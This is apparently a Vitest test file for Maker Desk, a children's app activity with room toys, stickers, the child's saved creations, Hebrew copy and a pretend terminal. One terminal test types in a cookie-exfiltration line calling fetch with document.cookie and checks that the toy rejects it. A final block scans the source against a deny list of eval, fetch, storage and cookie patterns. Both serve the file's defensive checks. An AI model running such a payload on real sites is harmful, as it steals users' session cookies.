/** Maker Desk through its real handlers, without a browser: the levels and
 * the way back, the three stickers and the finish, the child's own things,
 * and the pretend terminal as a closed toy. Layout, the canvas and real
 * audio are the rendered check (Playwright). */
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { isValidElement, type ReactElement } from 'react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
type Slot = { value?: any; deps?: readonly unknown[]; cleanup?: () => void };
const h = vi.hoisted(() => ({ cursor: 0, slots: [] as Slot[], lang: 'en', name: 'Noa', kept: [] as unknown[], creationsFor: [] as string[], keys: [] as ((e: any) => void)[],
  audio: { key: vi.fn(), tok: vi.fn(), chime: vi.fn(), chord: vi.fn(), boop: vi.fn(), power: vi.fn(), beep: vi.fn(), hm: vi.fn(), fanfare: vi.fn(), note: vi.fn(), run: vi.fn(), drops: vi.fn(), woof: vi.fn(), chirp: vi.fn(),
    click: vi.fn(), glass: vi.fn(), song: vi.fn(), magic: vi.fn(), finale: vi.fn(), hum: vi.fn(), stop: vi.fn(), dispose: vi.fn() } }));
vi.mock('react', async original => {
  const actual = await original<typeof import('react')>();
  return { ...actual,
    useState(initial: any) { const slot = h.slots[h.cursor++] ??= { value: typeof initial === 'function' ? initial() : initial }; return [slot.value, (next: any) => { slot.value = typeof next === 'function' ? next(slot.value) : next; }]; },
    useRef(initial: any) { return (h.slots[h.cursor++] ??= { value: { current: initial } }).value; },
    useEffect(effect: () => void | (() => void), deps: readonly unknown[]) {
      const index = h.cursor++, old = h.slots[index];
      if (old?.deps && old.deps.length === deps.length && old.deps.every((v, i) => Object.is(v, deps[i]))) return;
      old?.cleanup?.(); const slot = h.slots[index] = { deps } as Slot; slot.cleanup = effect() || undefined;
    },
  };
});
vi.mock('../../../../../../context/LanguageContext', () => ({ useLanguage: () => ({ uiLang: h.lang }) }));
vi.mock('../../../../../../context/ArborContext', () => ({ useArborOptional: () => ({ childProfile: { id: 'child-a', age: 7 } }) }));
vi.mock('../../../../../../lib/native', () => ({ selectionHaptic: async () => {} }));
vi.mock('../../../../game/GameShell', () => ({ GameShell: () => null, GameFinish: () => null }));
vi.mock('../../../../audio/kidAudio', () => ({ useKidReadAloudMuted: () => false, onKidHush: () => () => {}, kidAudioAllowed: () => false, kidAudioContext: () => null }));
vi.mock('../../../studioCopy', () => ({ studioCopy: (lang: string) => lang === 'he' ? { hello: 'היי', helloNoName: 'היי!' } : { hello: 'Hi', helloNoName: 'Hi there!' } }));
vi.mock('../../../studioCreations', () => ({ useStudioCreations: (childId: string) => { h.creationsFor.push(childId); return { items: h.kept, loaded: true, isCurrent: () => true }; } }));
vi.mock('../../../StudioCreationResult', () => ({ CreationPreview: () => null }));
vi.mock('../../../StudioMakerArt', () => ({ StudioMakerPreview: () => null, isMakerCreation: (c: { kind: string }) => ['bowl', 'textile', 'bottle'].includes(c.kind) }));
vi.mock('../../../useStudioHero', () => ({ useStudioHero: () => ({ name: h.name }) }));
vi.mock('./deskAudio', () => ({ createDeskAudio: () => h.audio }));
import MakerDesk, { PARTY_MS } from './MakerDesk';
import { CreationPreview } from '../../../StudioCreationResult';
import { DESK_KIT } from './deskKit';
import { DeskBounce } from './DeskBounce';
import { DeskTerminal } from './DeskTerminal';
import { GameFinish } from '../../../../game/GameShell';
import { HERO_NAME_FALLBACK } from '../../../../../../lib/heroNameFallback';
import { MAKER_DESK_COPY } from './makerDeskCopy';

type Props = { children?: unknown; onClick?: (e?: any) => void; [key: string]: any };
function nodes(node: unknown): ReactElement<Props>[] { if (Array.isArray(node)) return node.flatMap(nodes); if (!isValidElement<Props>(node)) return []; return [node, ...nodes(node.props.children)]; }
function words(node: unknown): string { if (typeof node === 'string') return node; if (Array.isArray(node)) return node.map(words).join(''); if (isValidElement<Props>(node)) return words(node.props.children); return ''; }
const render = () => { h.cursor = 0; return MakerDesk(); };
const find = (tree: unknown, test: (n: ReactElement<Props>) => boolean, what: string) => { const found = nodes(tree).find(test); expect(found, what).toBeDefined(); return found!; };
const spot = (tree: unknown, name: string) => find(tree, n => n.props['data-spot'] === name, `spot ${name}`);
const icon = (tree: unknown, program: string) => find(tree, n => n.props.className === 'md-icon' && n.props['data-program'] === program, `icon ${program}`);
const section = (tree: unknown) => find(tree, n => n.props['data-adventure'] === 'maker-desk', 'section');
const backTab = (tree: unknown) => find(tree, n => n.props.className === 'md-backtab', 'back tab');
const lit = (tree: unknown) => nodes(tree).filter(n => n.props.className === 'md-sticker' && n.props['data-lit'] === true).length;
const en = MAKER_DESK_COPY.en;
const escape = () => { for (const fn of h.keys) fn({ key: 'Escape' }); };

beforeEach(() => {
  h.slots = []; h.lang = 'en'; h.name = 'Noa'; h.kept = []; h.creationsFor = []; h.keys = [];
  Object.values(h.audio).forEach(fn => fn.mockClear());
  vi.useFakeTimers();
  vi.stubGlobal('window', { matchMedia: () => ({ matches: false }), addEventListener: (type: string, fn: any) => { if (type === 'keydown') h.keys.push(fn); }, removeEventListener: (_: string, fn: any) => { h.keys = h.keys.filter(k => k !== fn); } });
  vi.stubGlobal('document', { visibilityState: 'visible', addEventListener: vi.fn(), removeEventListener: vi.fn() });
});
afterEach(() => { vi.useRealTimers(); vi.unstubAllGlobals(); });

/** Room → desktop: tap the computer and let it warm up. */
function switchOn() { spot(render(), 'pc').props.onClick!(); vi.advanceTimersByTime(1100); const tree = render(); expect(section(tree).props['data-level']).toBe('desktop'); return tree; }

describe('Maker Desk', () => {
  it('the four room objects respond: lamp, window, shelf and computer', () => {
    let tree = render();
    expect(section(tree).props['data-level']).toBe('study');
    expect(nodes(tree).filter(n => n.type === 'button' && n.props['data-spot']).map(n => n.props['data-spot']).sort()).toEqual(['can', 'chock', 'flower', 'lamp', 'pc', 'shelf', 'tile-0', 'tile-1', 'tile-2', 'trays', 'window']);
    spot(tree, 'lamp').props.onClick!(); tree = render();
    expect(section(tree).props['data-light']).toBe('evening'); expect(spot(tree, 'lamp').props['aria-pressed']).toBe(true);
    spot(tree, 'window').props.onClick!(); tree = render(); expect(spot(tree, 'window').props['aria-pressed']).toBe(false);
    spot(tree, 'shelf').props.onClick!(); tree = render(); expect(spot(tree, 'shelf').props['aria-pressed']).toBe(true);
    expect(words(find(tree, n => n.props.role === 'status', 'status'))).toBe(en.shelfTag);
    spot(tree, 'pc').props.onClick!(); expect(h.audio.power).toHaveBeenCalledTimes(1);
    expect(section(render()).props['data-level']).toBe('study');
    vi.advanceTimersByTime(1100); expect(section(render()).props['data-level']).toBe('desktop');
  });
  it('the toys answer: the flower drinks and opens, each tool does its one thing, Chock and the stickers respond', () => {
    const status = () => words(find(render(), n => n.props.role === 'status', 'status'));
    const room = () => find(render(), n => n.props.className === 'md-room', 'room');
    const flower = () => find(render(), n => typeof n.props.className === 'string' && n.props.className.includes('md-flower') && 'data-stage' in n.props, 'flower');
    expect(flower().props['data-stage']).toBe(0);
    spot(render(), 'flower').props.onClick!(); expect(status()).toBe(en.plantGrow); expect(h.audio.drops).toHaveBeenLastCalledWith(false);
    spot(render(), 'can').props.onClick!(); spot(render(), 'flower').props.onClick!();
    expect(flower().props['data-stage']).toBe(3); expect(status()).toBe(en.plantBloom); expect(h.audio.drops).toHaveBeenLastCalledWith(true);
    spot(render(), 'flower').props.onClick!(); expect(flower().props['data-stage']).toBe(3); expect(status()).toBe(en.plantHappy);
    // The trays: a keyboard press takes each tool in turn; a pointer takes the one under it.
    spot(render(), 'trays').props.onClick!(); expect(status()).toBe(en.toolDo.proofLens);
    spot(render(), 'trays').props.onClick!(); expect(status()).toBe(en.toolDo.viewCheck); expect(room().props['data-low']).toBe(true);
    vi.advanceTimersByTime(1600); expect(room().props['data-low']).toBe(false);
    spot(render(), 'trays').props.onClick!(); expect(status()).toBe(en.toolDo.pulsePodWait); expect(room().props['data-paused']).toBe(true);
    spot(render(), 'trays').props.onClick!({ detail: 1, clientX: 150, currentTarget: { getBoundingClientRect: () => ({ left: 100, width: 100 }) } }); expect(status()).toBe(en.toolDo.pulsePodReady); expect(room().props['data-paused']).toBe(false);
    spot(render(), 'trays').props.onClick!({ detail: 1, clientX: 175, currentTarget: { getBoundingClientRect: () => ({ left: 100, width: 100 }) } }); expect(status()).toBe(en.toolDo.leafLabGood);
    spot(render(), 'chock').props.onClick!(); expect(h.audio.woof).toHaveBeenCalledTimes(1); expect(status()).toBe(en.chockPat);
    expect(spot(render(), 'chock').props['data-mood']).toBe('glad'); vi.advanceTimersByTime(1600); expect(spot(render(), 'chock').props['data-mood']).toBe('watch');
    find(render(), n => n.props.className === 'md-sticker' && n.props['data-sticker'] === 'lanterns', 'sticker').props.onClick!();
    expect(status()).toBe('Light every lantern: not yet');
  });
  it('shows the first tap with a ghost hand that returns after a quiet while and is gone once the screen wakes', () => {
    const hand = () => nodes(render()).some(n => n.props.className === 'md-ghost');
    expect(hand()).toBe(false); vi.advanceTimersByTime(1600); expect(hand()).toBe(true);
    for (const fn of h.keys) fn({ key: 'Tab' }); expect(hand()).toBe(false);
    vi.advanceTimersByTime(5900); expect(hand()).toBe(false); vi.advanceTimersByTime(200); expect(hand()).toBe(true);
    switchOn(); expect(hand()).toBe(false);
    backTab(render()).props.onClick!(); vi.advanceTimersByTime(8000); expect(section(render()).props['data-level']).toBe('study'); expect(hand()).toBe(false);
  });
  it('every level steps back one clear step at a time, by the tab or by Escape', () => {
    let tree = switchOn();
    expect(backTab(tree).props['data-back-to']).toBe('study'); expect(words(backTab(tree))).toContain(en.toDesk);
    icon(tree, 'bounce').props.onClick!(); tree = render();
    expect(section(tree).props['data-program']).toBe('bounce'); expect(backTab(tree).props['data-back-to']).toBe('desktop');
    backTab(tree).props.onClick!(); expect(section(render()).props['data-level']).toBe('desktop');
    icon(render(), 'ask').props.onClick!(); escape(); expect(section(render()).props['data-level']).toBe('desktop');
    escape(); expect(section(render()).props['data-level']).toBe('study');
    escape(); expect(section(render()).props['data-level']).toBe('study');
  });
  it('three discoveries light the stickers; then a Done tab appears in the room and finishes', () => {
    let tree = switchOn(); expect(lit(tree)).toBe(0);
    icon(tree, 'bounce').props.onClick!(); tree = render();
    find(tree, n => n.type === DeskBounce, 'bounce').props.onAllLit(); expect(lit(render())).toBe(1);
    backTab(render()).props.onClick!(); icon(render(), 'things').props.onClick!(); expect(lit(render())).toBe(2);
    backTab(render()).props.onClick!(); icon(render(), 'ask').props.onClick!(); tree = render();
    const term = find(tree, n => n.type === DeskTerminal, 'ask');
    term.props.onCommand('help'); term.props.onCommand('help'); term.props.onCommand(null); expect(lit(render())).toBe(2);
    term.props.onCommand('ls'); expect(lit(render())).toBe(3);
    vi.advanceTimersByTime(300); expect(h.audio.fanfare).toHaveBeenCalledTimes(1);
    expect(nodes(render()).some(n => n.props['data-maker-desk-done'] === '')).toBe(false);
    escape(); escape(); tree = render();
    expect(nodes(tree).some(n => n.type === GameFinish)).toBe(false);
    find(tree, n => n.props['data-maker-desk-done'] === '', 'done tab').props.onClick!();
    // The finish plays on the bench first (the tools ring, ProofLens keeps a picture), on plain timers; then the Studio gets it.
    tree = render(); expect(nodes(tree).some(n => n.type === GameFinish)).toBe(false);
    expect(find(tree, n => n.props.className === 'md-room', 'room').props['data-party']).toBe(1); expect(h.audio.finale).toHaveBeenCalledTimes(1);
    vi.advanceTimersByTime(PARTY_MS - 100); tree = render(); expect(nodes(tree).some(n => n.type === GameFinish)).toBe(false);
    expect(find(tree, n => n.props.className === 'md-room', 'room').props['data-party']).toBe(3); expect(nodes(tree).some(n => n.props.className === 'md-keepsake')).toBe(true);
    vi.advanceTimersByTime(200);
    const finish = find(render(), n => n.type === GameFinish, 'finish');
    expect(finish.props.creation).toBeUndefined(); expect(finish.props.title).toBe(en.finish);
  });
  it('shows only the current child’s things, on the shelf, in My Things and in the terminal', () => {
    h.kept = [{ id: 'bowl', creation: { kind: 'bowl', glaze: 'rose', pattern: 0, seams: [3, 2, 1, 0] } }, { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }];
    let tree = render();
    expect(h.creationsFor.every(id => id === 'child-a')).toBe(true);
    expect(nodes(tree).filter(n => n.props.className === 'md-shelf__place').map(n => n.props['data-kind'])).toEqual(['bowl', 'dance', 'empty', 'empty', 'empty', 'empty']);
    switchOn(); icon(render(), 'things').props.onClick!(); tree = render();
    expect(nodes(tree).filter(n => n.props.className === 'md-things__tile').map(n => n.props['data-thing'])).toEqual(['bowl', 'dance']);
    backTab(tree).props.onClick!(); icon(render(), 'ask').props.onClick!();
    const term = find(render(), n => n.type === DeskTerminal, 'ask');
    expect(term.props.things).toEqual(['bowl', 'dance']); expect(term.props.hello).toEqual({ word: 'Hi', noName: 'Hi there!', name: 'Noa' });
  });
  it('a thing on the show steps can be held up, and one that is new since last time is noticed', () => {
    const bowl = (glaze: string) => ({ id: 'bowl', creation: { kind: 'bowl', glaze, pattern: 0, seams: [3, 2, 1, 0] } });
    const place = (tree: unknown) => find(tree, n => n.props.className === 'md-shelf__place' && n.props['data-kind'] === 'bowl', 'bowl place');
    h.kept = [bowl('rose')]; let tree = render();
    vi.advanceTimersByTime(800); tree = render();
    expect(h.audio.run).toHaveBeenCalledWith(1); expect(place(tree).props['data-fresh']).toBe(false);
    find(tree, n => n.props['data-shelf-thing'] === 'bowl', 'bowl').props.onClick!(); tree = render();
    const shown = find(tree, n => n.props.className === 'md-show', 'held up');
    expect(nodes(shown).filter(n => n.type === CreationPreview).map(n => n.props.creation.kind)).toEqual(['bowl']);
    escape(); tree = render(); expect(nodes(tree).some(n => n.props.className === 'md-show')).toBe(false); expect(section(tree).props['data-level']).toBe('study');
    // The same child comes back to the desk later in the sitting with the bowl made again, and a new dance.
    h.slots = []; h.kept = [bowl('indigo'), { id: 'dance', creation: { kind: 'dance', moves: [0, null, 1, null, null, null, null, null], tempo: 640 } }]; render();
    vi.advanceTimersByTime(800); tree = render();
    expect(place(tree).props['data-fresh']).toBe(true);
    expect(words(find(tree, n => n.props.role === 'status', 'status'))).toBe('New on the show steps: Your mended bowl, Your dance!');
    find(tree, n => n.props['data-shelf-thing'] === 'bowl', 'bowl').props.onClick!(); expect(place(render()).props['data-fresh']).toBe(false);
  });
  it('CrewLink shows who is around: Chock always, and one friend who dropped by', () => {
    const tree = switchOn();
    const dots = nodes(tree).filter(n => n.props.className === 'md-crew__dot');
    expect(dots.map(n => n.props['data-crew'])).toEqual(['bebe', 'gobgob', 'chock', 'pep', 'aya']);
    expect(dots.find(n => n.props['data-crew'] === 'chock')!.props['data-here']).toBe(true);
    expect(dots.filter(n => n.props['data-here']).length).toBe(2);
    dots.find(n => n.props['data-crew'] === 'aya')!.props.onClick!();
    expect(words(find(render(), n => n.props.role === 'status', 'status'))).toBe(en.crewAway.aya);
  });
  it('an empty desk shows a friendly empty My Things, and greets without a name by the Studio convention', () => {
    h.name = HERO_NAME_FALLBACK; switchOn(); icon(render(), 'things').props.onClick!();
    expect(words(find(render(), n => n.props.className === 'md-things md-things--empty', 'empty'))).toBe(en.thingsEmpty);
    backTab(render()).props.onClick!(); icon(render(), 'ask').props.onClick!();
    expect(find(render(), n => n.type === DeskTerminal, 'ask').props.hello.name).toBeNull();
  });
  it('carries every word in Hebrew', () => {
    const he = MAKER_DESK_COPY.he;
    const shape = (value: unknown): unknown => Array.isArray(value) ? value.map(shape) : value && typeof value === 'object' ? Object.fromEntries(Object.entries(value).map(([k, v]) => [k, shape(v)])) : typeof value;
    expect(shape(he)).toEqual(shape(en));
    for (const key of ['title', 'description', 'instruction'] as const) { expect(he[key]).toMatch(/[֐-׿]/); expect(he[key]).not.toMatch(/[A-Za-z]/); }
    h.lang = 'he'; const tree = render();
    expect(section(tree).props.dir).toBe('rtl'); expect(words(find(tree, n => n.props.className === 'md-cue', 'cue'))).toBe(he.roomCue);
  });
  it('every cue is eight words or fewer, in both languages', () => {
    for (const w of [en, MAKER_DESK_COPY.he]) for (const cue of [w.roomCue, w.roomEvening, w.desktopCue, w.bounceCue, w.thingsCue, w.terminalCue, w.allStickers]) expect(cue.split(/\s+/).length, cue).toBeLessThanOrEqual(8);
  });
  it('stages the desk on kit pictures only: shipped art and one cut of the TrailBench, none of them showing a child', () => {
    const pictures = Object.values(DESK_KIT);
    expect(pictures.length).toBeGreaterThan(10);
    for (const picture of pictures) {
      expect(picture.src).toMatch(/^\/visuals\/studio-v2\/(bop|v30|makers)\/[a-z0-9-]+\.webp$/); expect(picture.width).toBeGreaterThan(0); expect(picture.source.length).toBeGreaterThan(10);
      expect(picture.src).not.toMatch(/bebe|gobgob|crew/);
    }
    // One picture is cut for this activity alone; the companions' faces come from the Studio's shared kit library.
    const made = pictures.filter(picture => picture.src.includes('/makers/'));
    expect(made.filter(picture => !/\/kit-(chock|aya)-[a-z]+\.webp$/.test(picture.src)).map(picture => picture.src)).toEqual(['/visuals/studio-v2/makers/maker-desk-bench.webp']);
    expect(made).toHaveLength(6);
    const publicDir = path.join(path.dirname(fileURLToPath(import.meta.url)), '../../../../../../../public');
    for (const picture of pictures) expect(readdirSync(path.join(publicDir, path.dirname(picture.src))), picture.src).toContain(path.basename(picture.src));
  });
});

describe('Ask the computer: what is typed stays a toy', () => {
  const renderTerm = (onCommand = vi.fn()) => { h.cursor = 0; return DeskTerminal({ w: en, lang: 'en', things: ['bowl'], hello: { word: 'Hi', noName: 'Hi there!', name: null }, audio: h.audio as any, onCommand }); };
  const input = (tree: unknown) => find(tree, n => n.type === 'input', 'input');
  /** The lines on the pretend screen, as text. */
  const screen = (tree: unknown) => nodes(find(tree, n => n.props.role === 'log', 'log')).filter(n => n.props.line).map(n => JSON.stringify(n.props.line)).join('\n');
  it('runs the big command buttons and typed words through the fixed table only', () => {
    const onCommand = vi.fn();
    let tree = renderTerm(onCommand);
    expect(nodes(tree).filter(n => n.props['data-command']).map(n => n.props['data-command'])).toEqual(['help', 'ls', 'cat about.txt', 'hello', 'dance', 'sing', 'clear']);
    find(tree, n => n.props['data-command'] === 'cat about.txt', 'about').props.onClick!();
    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.about[0]); expect(onCommand).toHaveBeenLastCalledWith('cat about.txt', null);
    input(tree).props.onChange({ target: { value: 'fetch("https://example.com/?q=" + document.cookie)' } });
    input(renderTerm(onCommand)).props.onKeyDown({ key: 'Enter', preventDefault: vi.fn() });
    tree = renderTerm(onCommand); expect(screen(tree)).toContain(en.unknown); expect(onCommand).toHaveBeenLastCalledWith(null, null);
    expect(input(tree).props.value).toBe('');
    find(tree, n => n.props['data-command'] === 'clear', 'clear').props.onClick!();
    expect(screen(renderTerm(onCommand))).toBe('');
    // The typed words appear only as the echoed line on this component's own screen.
    expect(h.slots.some(slot => JSON.stringify(slot.value ?? '').includes('document.cookie'))).toBe(false);
  });
  it('a command can reach outside the screen only through its fixed effect, and plays its own sound', () => {
    const onCommand = vi.fn();
    const type = (text: string) => { input(renderTerm(onCommand)).props.onChange({ target: { value: text } }); input(renderTerm(onCommand)).props.onKeyDown({ key: 'Enter', preventDefault: vi.fn() }); };
    type('lamp'); expect(onCommand).toHaveBeenLastCalledWith('lamp', 'lamp');
    type('sing'); expect(h.audio.song).toHaveBeenCalledTimes(1); expect(onCommand).toHaveBeenLastCalledWith('sing', null);
    type('abracadabra'); expect(h.audio.magic).toHaveBeenCalledTimes(1); expect(screen(renderTerm(onCommand))).toContain('"show":"starfall"');
    type('lamp on'); expect(onCommand).toHaveBeenLastCalledWith(null, null); expect(h.audio.hm).toHaveBeenCalledTimes(1);
  });
  it('Tab finishes a known word; with nothing to finish it lets focus move on', () => {
    let tree = renderTerm();
    input(tree).props.onChange({ target: { value: 'cat th' } }); tree = renderTerm();
    expect(nodes(tree).filter(n => n.props.className === 'md-chip').map(words)).toEqual(['cat things/bowl']);
    const tab = { key: 'Tab', shiftKey: false, preventDefault: vi.fn() };
    input(tree).props.onKeyDown(tab); expect(tab.preventDefault).toHaveBeenCalled(); expect(input(renderTerm()).props.value).toBe('cat things/bowl');
    input(renderTerm()).props.onChange({ target: { value: '' } });
    const free = { key: 'Tab', shiftKey: false, preventDefault: vi.fn() };
    input(renderTerm()).props.onKeyDown(free); expect(free.preventDefault).not.toHaveBeenCalled();
  });
  it('the input never keeps more than the toy reads', () => {
    const tree = renderTerm();
    expect(input(tree).props.maxLength).toBe(40); expect(input(tree).props.autoComplete).toBe('off'); expect(input(tree).props.spellCheck).toBe(false);
    input(tree).props.onChange({ target: { value: 'x'.repeat(200) } }); expect(input(renderTerm()).props.value).toHaveLength(40);
  });
});

describe('the Maker Desk source is a closed toy', () => {
  const here = path.dirname(fileURLToPath(import.meta.url));
  const files = readdirSync(here).filter(f => /\.(tsx?)$/.test(f) && !/\.test\.tsx?$/.test(f));
  const strip = (s: string) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');
  it('nothing evaluates, fetches, stores or sends what the child does', () => {
    expect(files).toContain('DeskTerminal.tsx'); expect(files).toContain('makerDeskRules.ts');
    const FORBIDDEN = [/\beval\s*\(/, /new\s+Function\b/, /\bFunction\s*\(/, /\bfetch\s*\(/, /XMLHttpRequest/, /WebSocket/, /EventSource/, /sendBeacon/, /localStorage/, /sessionStorage/, /indexedDB/, /document\.cookie/,
      /useChildCollection/, /\bimport\s*\(/, /dangerouslySetInnerHTML/, /innerHTML/, /postMessage/, /setTimeout\s*\(\s*['"`]/, /\.save\s*\(/, /\bkidSay\b/, /speakText/];
    for (const file of files) for (const pattern of FORBIDDEN) expect(pattern.test(strip(readFileSync(path.join(here, file), 'utf8'))), `${file}: ${pattern}`).toBe(false);
  });
  it('the rules module is pure: no React, no DOM, no clock', () => {
    const rules = strip(readFileSync(path.join(here, 'makerDeskRules.ts'), 'utf8'));
    for (const pattern of [/from 'react'/, /\bwindow\b/, /\bdocument\b/, /Date\.now|new Date/, /Math\.random/, /setTimeout|setInterval/]) expect(pattern.test(rules), String(pattern)).toBe(false);
  });
});
